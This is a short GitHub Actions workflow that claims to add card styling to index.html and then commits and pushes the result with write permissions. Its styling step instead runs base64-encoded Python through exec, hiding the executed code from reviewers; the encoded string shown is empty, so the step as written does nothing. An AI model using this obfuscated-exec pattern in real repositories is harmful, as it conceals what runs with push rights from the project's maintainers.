name: Add SR card styling

on:
  push:
    paths:
      - '.github/workflows/add-sr-cards.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Add SR styling to cards 18 and 20
        shell: bash
        run: python -c "import base64; exec(base64.b64decode(''))"
      - name: Commit changes
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html
          git commit -m "Style cards 18 and 20 as SR"
          git push
